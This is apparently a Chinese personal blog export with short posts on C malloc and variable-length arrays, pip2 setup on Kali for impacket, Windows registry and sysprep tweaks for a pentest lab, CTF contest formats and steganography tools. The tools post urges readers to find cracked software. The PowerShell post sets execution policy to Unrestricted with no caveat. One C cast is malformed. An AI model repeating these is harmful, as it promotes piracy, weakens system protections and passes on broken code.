<p>另一方面，使用由 malloc（）创建的数组不必局限在一个函数中。</p>
<p>例如，函数可以创建一个数组并返回指针，供调用该函数的函数访问。<br>接着，后者可以在它结束时调用 free（）。<br>free（）可以使用不同于 malloc（）指针的指针变量：必须一致的是指针中存储的地址。</p>
<p><code>VLA 对多维数组来说更方便。</code><br>您可以使用 malloc（）来定义一个二维数组，但语法很麻烦。<br>如果编译器不支持 VLA 特性，必须固定一维的大小，正如下面的函数调用：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n = <span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> m = <span class="number">6</span>;</span><br><span class="line"><span class="type">int</span> ar2[n][m];<span class="comment">//n*m 的变长数组 </span></span><br><span class="line"><span class="type">int</span>(* p2) [<span class="number">6</span>];<span class="comment">//在c99之前可以使用 </span></span><br><span class="line"><span class="type">int</span>(* p3) [m];<span class="comment">//要求变长数组支持 </span></span><br><span class="line"></span><br><span class="line">p2 = (<span class="type">int</span> (*)<span class="number">6</span>) <span class="built_in">malloc</span> (n * <span class="number">6</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));<span class="comment">// n*6 数组 </span></span><br><span class="line">p3 = (<span class="type">int</span> (*)[m]) <span class="built_in">malloc</span> (n * m * <span class="keyword">sizeof</span>(<span class="type">int</span>));<span class="comment">// n*m 数组 </span></span><br><span class="line"><span class="comment">//上面的表达式也要求变长数组支持 </span></span><br><span class="line"></span><br><span class="line">ar2[<span class="number">1</span>][<span class="number">2</span>] = p2[<span class="number">1</span>][<span class="number">2</span>] = <span class="number">12</span>;</span><br></pre></td></tr></table></figure></div>
<p>有必要查看一下指针声明。函数malloc（）返回一个指针，因此p2必须是适当类型的指针。<br>下面的声明：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>(* p2) [<span class="number">6</span>];<span class="comment">//在c99之前可以使用</span></span><br></pre></td></tr></table></figure></div>

<p> 表明p2指向一个包含6个int值的数组。<br>这意味着p2将被解释为一个由6个整数构成的元素，p2[ i ][ j ]将是一个int值。</p>
<p>第二个指针声明使用变量来指定p3所指数组的大小。<br>这意味着p3将被看作<code>一个指向 VLA 的指针</code>，这正是代码不能在C90标准中运行的原因。</p>
<h3 id="内存类与动态内存分配"><a href="#内存类与动态内存分配" class="headerlink" title="内存类与动态内存分配"></a>内存类与动态内存分配</h3><p>您可能正在为存储类和动态内存分配之间的联系感到疑惑。</p>
<p>我们来看一个理想模型。<br>可以认为程序将它的可用内存分成了三个独立的部分：<br>一个是具有外部链接的、具有内部链接的以及具有空链接的静态变量的：<br>一个是自动变量的：<br>另一个是动态分配的内存的。<br><code>(静态变量)：</code><br>在编译时就已经知道了静态存储时期存储类变量所需的内存数量，存储在这一部分的数据在整个程序运行期间都可用。</p>
<p>这一类型的每个变量在程序开始时就已存在，到程序结束时终止。</p>
<p><code>(动态变量)：</code><br>然而，一个自动变量在程序进入包含该变量定义的代码块时产生，在退出这一代码块时终止。</p>
<p>因此，伴随着程序对函数的调用和终止，自动变量使用的内存数量也在增加和减少。</p>
<p>典型地，将这一部分内存处理为一个堆栈。</p>
<p>这意味着在内存中，新变量在创建时按顺序加入，在消亡时按相反顺序移除。</p>
<p><code>(动态内存分配)：</code><br>动态分配的内存在调用malloc（）或相关函数时产生，在调用free（）时释放。</p>
<p>由程序员而不是一系列固定的规则控制内存持续时间，因此内存块可在一个函数中创建，而在另一个函数中释放。(malloc 可以跨函数调用)</p>
<p>由于这点，动态内存分配所用的内存部分可能变成碎片状，也就是说，在活动的内存块之间散布着未使用的字节片。</p>
<p>不管怎样，使用动态内存往往导致进程比使用堆栈内存慢。</p>
]]></content>
      <categories>
        <category>C语言</category>
        <category>基础部分</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>kali环境下的pip2安装</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/kali/pip2%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="pip2安装"><a href="#pip2安装" class="headerlink" title="pip2安装"></a>pip2安装</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>有些工具需要用到python2，但又需要pip下载包，而kali并没有自带pip2命令，所以需要手动安装pip2</strong></p>
<h2 id="1、安装setuptools-18-5（路径随便）"><a href="#1、安装setuptools-18-5（路径随便）" class="headerlink" title="1、安装setuptools-18.5（路径随便）"></a><strong>1、安装setuptools-18.5</strong>（路径随便）</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://pypi.python.org/packages/source/s/setuptools/setuptools-18.5.tar.gz //安装文件包</span><br><span class="line">//（可能会比较慢，可以通过物理机下载后传进去）</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913222915609.png"
                      alt="image-20240913222915609"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">//解压文件包然后进入目录</span><br><span class="line">tar -zxvf setuptools-18.5.tar.gz</span><br><span class="line"><span class="built_in">cd</span> setuptools-18.5/</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913222940730.png"
                      alt="image-20240913222940730"
                ></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">//用root权限安装依赖</span><br><span class="line"><span class="built_in">sudo</span> python2 setup.py build</span><br><span class="line"><span class="built_in">sudo</span> python2 setup.py install</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913223123209.png"
                      alt="image-20240913223123209"
                ></p>
<h2 id="2、安装pip2"><a href="#2、安装pip2" class="headerlink" title="2、安装pip2"></a>2、安装pip2</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py	//下载pip安装py包（可能会比较慢，可以通过物理机下载后传进去）</span><br><span class="line"><span class="built_in">sudo</span> python2 get-pip.py  </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913224726285.png"
                      alt="image-20240913224726285"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/pip2%E5%AE%89%E8%A3%85/image-20240913224913728.png"
                      alt="image-20240913224913728"
                ></p>
<p><strong>此时可能会有报错，报错需要安装python2-dev（kali源已经更新的条件下）</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install python2-dev</span><br></pre></td></tr></table></figure></div>

<p><strong>此时再执行<code>python2 get-pip.py</code>，就会继续安装</strong></p>
<p><strong>安装过程中会有读取超时的报错则需反复多试几次则可成功运行</strong></p>
<blockquote>
<p>猜测是访问网络问题导致超时</p>
</blockquote>
<h2 id="3、使用pip2安装模块"><a href="#3、使用pip2安装模块" class="headerlink" title="3、使用pip2安装模块"></a>3、使用pip2安装模块</h2><p>更换pip源（不安装源，反复执行也行，但速度非常慢，安装后运行速度会大大提升）</p>
<p>pip更新阿里云快速下载：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure></div>

<p>pip更新清华源快速下载：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure></div>

<h2 id="更新后的pip安装命令"><a href="#更新后的pip安装命令" class="headerlink" title="更新后的pip安装命令"></a>更新后的pip安装命令</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip2 install impacket</span><br></pre></td></tr></table></figure></div>

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://blog.csdn.net/huayimy/article/details/128338899?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522188AE452-3D06-4121-8A1A-E9F40B09180A%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=188AE452-3D06-4121-8A1A-E9F40B09180A&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-128338899-null-null.nonecase&utm_term=pip2%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4450" >Kali Python2.7安装pip2和模块方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>windows系统powershell脚本运行策略</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/powershell%E8%BF%90%E8%A1%8C%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<h2 id="powershell脚本运行策略"><a href="#powershell脚本运行策略" class="headerlink" title="powershell脚本运行策略"></a>powershell脚本运行策略</h2><p><strong>Powershell一般初始化情况下都会禁止脚本执行。脚本能否执行取决于Powershell的执行策略</strong></p>
<h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ExecutionPolicy </span><br></pre></td></tr></table></figure></div>

<p><strong>Unrestricted</strong>:权限最高，可以不受限制执行任何脚本</p>
<p>Default:为Powershell默认的策略</p>
<p>Restricted，不允许任何脚本执行</p>
<p>AllSigned：所有脚本都必须经过签名才能在运行</p>
<p>RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名</p>
<h3 id="改变运行策略"><a href="#改变运行策略" class="headerlink" title="改变运行策略"></a>改变运行策略</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>操作系统</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>windows系统右键菜单栏自定义添加程序</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="右键菜单栏自定义添加程序"><a href="#右键菜单栏自定义添加程序" class="headerlink" title="右键菜单栏自定义添加程序"></a>右键菜单栏自定义添加程序</h1><h2 id="右键菜单栏划分"><a href="#右键菜单栏划分" class="headerlink" title="右键菜单栏划分"></a>右键菜单栏划分</h2><ol>
<li><p>在空白处右键（桌面右键）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213332631.png"
                      alt="image-20240913213332631"
                ></p>
</li>
<li><p>在文件上右键</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213409634.png"
                      alt="image-20240913213409634"
                ></p>
</li>
<li><p>在文件夹上右键</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213440530.png"
                      alt="image-20240913213440530"
                ></p>
</li>
</ol>
<h2 id="菜单栏对应注册表位置"><a href="#菜单栏对应注册表位置" class="headerlink" title="菜单栏对应注册表位置"></a>菜单栏对应注册表位置</h2><p>空白处右键： <code>HKEY_CLASSES_ROOT/Directory/background/shell</code></p>
<p>文件夹右键： <code>HKEY_CLASSES_ROOT/Directory/shell</code></p>
<p>文件上右键： <code>HKEY_CLASSES_ROOT/*/shell</code></p>
<h2 id="添加示例"><a href="#添加示例" class="headerlink" title="添加示例"></a>添加示例</h2><p><strong>这里以在文件上右键为例</strong></p>
<p>首先<code>win+R</code>输入<code>regedit</code>进入注册表</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913213831309.png"
                      alt="image-20240913213831309"
                ></p>
<p>进入文件的右键操作目录<code>HKEY_CLASSES_ROOT/*/shell</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214022631.png"
                      alt="image-20240913214022631"
                ></p>
<p>右击<code>shell</code>，添加项，这个项就是你要添加的右键的文件目录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214353893.png"
                      alt="image-20240913214353893"
                ></p>
<p>这里示例新建一个test项，在它的默认文件里面添加数值（双击），这个值是你右键添加的名字</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214527696.png"
                      alt="image-20240913214527696"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214650774.png"
                      alt="image-20240913214650774"
                ></p>
<p>再右击test项，添加一个 <code>字符串值</code>，命名为<code>icon</code>，<strong>只能命名为这个值</strong>，添加你想要的图标**路径 + 空格 + “%1”**，例如<code>C:/test.exe &quot;%1&quot;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214827266.png"
                      alt="image-20240913214827266"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913214915488.png"
                      alt="image-20240913214915488"
                ></p>
<p>最后在test项下面再添加一个项，命名为<code>command</code>，给它的默认值添加你要运行的软件的路径，如<code>C:/test.exe</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913215633160.png"
                      alt="image-20240913215633160"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="F:/Blog/source/images/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%A0%8F%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B7%BB%E5%8A%A0%E6%89%93%E5%BC%80/image-20240913215813847.png"
                      alt="image-20240913215813847"
                ></p>
<p>到这里就自定义完成了，其他的文件夹右键等同理操作，只是初目录不一样而已</p>
<h2 id="参考文案"><a href="#参考文案" class="headerlink" title="参考文案"></a>参考文案</h2><p><a class="link"   href="https://blog.csdn.net/Mrceel/article/details/107459678" >win10 给右键文件、文件夹、桌面菜单添加程序（项） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>windows系统修改系统SID</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/%E4%BF%AE%E6%94%B9SID/</url>
    <content><![CDATA[<h1 id="修改SID"><a href="#修改SID" class="headerlink" title="修改SID"></a>修改SID</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>修改SID一般用在windows server机器上，做内网渗透搭建域环境时需要的，因为域环境不能有SID相同的机器</p>
<blockquote>
<p><strong>注意：用sysprep修改SID之后，系统会自动重启，之前配置好的网络、修改过的机器名会重置。所以，该操作需要在配置网络、修改机器名之前进行操作。</strong></p>
</blockquote>
<p>先找到<code>C:\Windows\System32\Sysprep</code>路径下的<code>sysprep.exe</code>工具，双击运行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011102623.png"
                      alt="image-20240914011102623"
                ></p>
<p>勾选通用，点击确定</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011117051.png"
                      alt="image-20240914011117051"
                ></p>
<p>稍微等待一会，系统会重启</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011125163.png"
                      alt="image-20240914011125163"
                ></p>
<p>重启之后进入到配置界面</p>
<p>设置好密码，点击完成（密码可能要包含数字、字母、特殊符号三种才行）</p>
<p>查看系统的SID可以在cmd命令行下，输入<code>wmic useraccount get name,sid</code>命令进行查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../images/%E4%BF%AE%E6%94%B9SID/image-20240914011313526.png"
                      alt="image-20240914011313526"
                ></p>
<p>SID修改完成！</p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF竞赛模式</title>
    <url>/2024/09/12/ctf/data/another/%E7%AB%9E%E8%B5%9B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="竞赛模式"><a href="#竞赛模式" class="headerlink" title="竞赛模式"></a>竞赛模式</h1><p>CTF竞赛模式具体分为以下几类：</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h3><p>理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p>
<h3 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h3><p>参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。</p>
<p>不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。</p>
<p>当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为<code>动态积分</code></p>
<p>题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p>
<h3 id="AwD-攻防模式"><a href="#AwD-攻防模式" class="headerlink" title="AwD-攻防模式"></a>AwD-攻防模式</h3><p><strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为<code>GameBox</code>，每个队伍之间的GameBox<code>配置及漏洞是完全一致</code>的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为<code>Checker</code>的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。</p>
<p>AwD通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p>
<h3 id="ADP-攻防增强"><a href="#ADP-攻防增强" class="headerlink" title="ADP-攻防增强"></a>ADP-攻防增强</h3><p><strong>A</strong>ttack <strong>D</strong>efense <strong>P</strong>lus(ADP)全称攻防增强模式，在该模式下中，参赛队伍连接到同一个网络空间。主办方会在平台上放置题目，选手需要登录到平台获得题目信息</p>
<p>攻击模式下，平台会给出题目的访问链接，选手按照解题模式做题提交flag即可完成攻击，当完成攻击后， 每轮计算分数时均会计算该题目的攻击得分。</p>
<p>防御模式下，选手需要自行挖掘题目的漏洞，并制作漏洞补丁包上传至平台，之后点击验证。验证时平台会新建一个完全干净的题目环境，使用预置的Exploit进行攻击，若攻击成功当验证通过之后（即已经完成修补），每轮计算分数均会认为该题目已防御。</p>
<p>也就是说，对于每个题目，仅需要攻击成功一次，防御成功一次，该题就可以认为已完成，后续无需进行关注。</p>
<p>ADP通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。随着比赛的进行，最早的题目可能会下线，后续也有可能会上线新的题目。</p>
<p>ADP相较于AwD来说，选手无须编写批量攻击脚本，也无需关注题目的环境是否被攻击，是否服务异常等等，要做的只是攻击一次，防御一次，选手可以有更多的时间聚焦于还未完成的题目。从主办方的角度来说，大大减轻了比赛的硬件成本和运维成本。</p>
<h3 id="RHG-自动化-AI自动化"><a href="#RHG-自动化-AI自动化" class="headerlink" title="RHG-自动化[AI自动化]"></a>RHG-自动化[AI自动化]</h3><p><strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于<code>漏洞理解</code>以及<code>工程化</code>能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为<code>bot</code>，在程序中<code>全自动</code>访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。</p>
<p>比赛过程中不允许选手对bot进行任何的操作(包括debug&#x2F;patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p>
<h3 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW-真实世界"></a>RW-真实世界</h3><p><strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年<code>长亭科技</code>主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM&#x2F;Docker逃逸、针对浏览器的攻击、针对IoT&#x2F;Car等设备的攻击，Web类攻击等等<br>在RW赛制中会有一个<code>Show Time</code>，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为<code>5分钟</code>，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如未在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率</p>
<p>举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码&#x2F;数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并<code>不存在Flag</code>。</p>
<h3 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH-抢占山头"></a>KoH-抢占山头</h3><p><strong>K</strong>ing <strong>o</strong>f <strong>H</strong>ill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(<code>队伍名称</code>或是<code>Token</code>之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p>
<h3 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix[混合]"></a>Mix[混合]</h3><p>混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p>
<hr>
<p>搬迁自<a class="link"   href="https://www.wolai.com/ctfhub/mmJYyc569kAXHvfam4qont" >CTF官方指导 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>another</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>data</tag>
      </tags>
  </entry>
  <entry>
    <title>隐写术</title>
    <url>/2024/09/18/ctf/data/misc/%E9%9A%90%E5%86%99%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h1><p>隐写术即通过一定手段达到信息隐藏的目的，不让除预期的接收者之外的任何人知晓信息的传递事件或信息内容</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里会提供一些来自buuctf的案例，有需要还原的可以看我的博客的关于这一节的题目</p>
<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2>
  <div class="note p-4 mb-4 rounded-small warning fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-exclamation"></i><p>提供的工具若未破解或链接已挂，请自行搜索破解版使用</p>

  </div>

<p><a class="link"   href="https://www.52pojie.cn/thread-1863194-1-1.html" >010Editor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 16进制编辑器</p>
<p><a class="link"   href="https://github.com/ReFirmLabs/binwalk" >Binwalk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 数据分离工具</p>
<p><a class="link"   href="https://github.com/Giotino/stegsolve/tree/v.1.5" >stegsolve <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> LSB工具（windows）</p>
<p><a class="link"   href="https://github.com/zed-0xff/zsteg" >zsteg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  LSB工具（linux）</p>
<p><a class="link"   href="https://github.com/fire-keeper/BlindWatermark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 盲水印工具</p>
<blockquote>
<p>上面这个是新的，案例提供的是这个<a class="link"   href="https://github.com/chishaxie/BlindWaterMark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
